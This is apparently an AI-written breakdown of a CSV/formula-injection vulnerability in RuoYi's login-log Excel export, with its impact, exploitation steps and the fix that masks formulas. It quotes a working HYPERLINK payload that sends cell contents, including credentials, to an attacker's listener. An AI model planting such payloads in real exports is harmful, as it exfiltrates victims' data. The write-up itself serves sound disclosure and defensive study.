Based on the provided content, here's a breakdown of the CSV injection vulnerability:

*   **Root Cause:** The application doesn't sanitize user-controlled input (specifically, the `username` field during login) before including it in a log file that is later exported as a CSV/XLSX file. This allows an attacker to inject spreadsheet formulas.

*   **Weaknesses/Vulnerabilities:**
    *   **CSV Injection:** The core issue is the lack of sanitization of user-provided data when generating CSV/XLSX files.
    *   **Formula Injection:** Specifically, the use of `HYPERLINK` function within the injected username allows the execution of arbitrary web requests.

*   **Impact of Exploitation:**
    *   **Information Disclosure:** The attacker can potentially exfiltrate data from the victim's machine. In the provided example, the attacker is able to extract the username and other potentially sensitive information (cell contents within the exported log file). This is done by crafting the malicious username to include an HTTP request containing this information within the URL.
    *   **Arbitrary Code Execution:**  While not directly demonstrated, CSV injection vulnerabilities can, in some cases, be chained with other vulnerabilities to achieve remote code execution if the spreadsheet software is vulnerable to specific formula or macro attacks. This content focuses on information disclosure, however.

*  **Attack Vectors:**
    *   **Manipulated Login Request:** The attacker injects the malicious formula into the `username` field of the login request. The request to the application is modified using a tool like Burp Suite.

*   **Required Attacker Capabilities/Position:**
    *   **Network Access:** The attacker needs to be able to send requests to the vulnerable application and receive responses from the generated web requests.
    *   **HTTP Request Manipulation:** The attacker needs to be able to intercept and modify HTTP requests.

**Additional Details from the Content:**

*   **Specific Payload:** The attacker injects the following into the `username` field : `=HYPERLINK("http://localhost:8007?u="%26B2%26B3%2c"E")`
*   **Exploitation Steps:**
    1.  Modify username during login to the payload.
    2.  Start an HTTP server on attacker's machine to listen for connections.
    3.  View login logs and export as XLSX file.
    4.  Open the XLSX file, and interact with the injected cell. This will send a request to the attacker's server including the contents of B2 and B3 cells which were the username and password for this example.
*   **Mitigation:** The issue was fixed by "屏蔽公式" (masking formulas) during the export process. The commit link provided ([https://gitee.com/y\_project/RuoYi/commit/e9ebf86ac8a53bfc8475c7efad6f63a593eaefa9](https://gitee.com/y_project/RuoYi/commit/e9ebf86ac8a53bfc8475c7efad6f63a593eaefa9)) confirms this by stating "Export Excel to mask the formula to prevent CSV injection risk"